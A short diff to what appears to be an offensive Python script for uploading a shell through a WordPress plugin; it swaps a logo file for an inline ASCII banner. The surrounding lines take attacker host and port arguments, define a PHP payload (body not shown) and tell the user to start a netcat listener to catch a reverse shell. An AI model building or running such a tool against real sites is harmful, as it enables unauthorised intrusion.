@@ -27,6 +27,22 @@ LHOST = args.LHOST
 LPORT = args.LPORT
 
 
+def logo():
+
+    banner = "\n  /\/\   __ _| (_) ___(_) ___  _   _ ___\n"
+    banner += " /    \ / _` | | |/ __| |/ _ \| | | / __|\n"
+    banner += "/ /\/\ | (_| | | | (__| | (_) | |_| \__ \ \n"
+    banner += "\/    \/\__,_|_|_|\___|_|\___/ \__,_|___/\n"
+    banner += "            (Shell upload in WordPress plugin)\n"
+
+    banner += "─────▄───▄\n"
+    banner += "─▄█▄─█▀█▀█─▄█▄\n"
+    banner += "▀▀████▄█▄████▀▀\n"
+    banner += "─────▀█▀█▀\n"
+
+    return banner
+    
+
 class Script:
 
     payload = f"""<?php
@@ -166,7 +182,7 @@ if __name__ == '__main__':
         if host is not None and username_value is not None and password_value is not None \
             and LHOST is not None and LPORT is not None:
 
-            print(open('logo.txt', 'rt').read())
+            print(logo())
             print(f"[!] ---> execute [nc -lvp {LPORT}]\n")
 
             print("===" * 15)
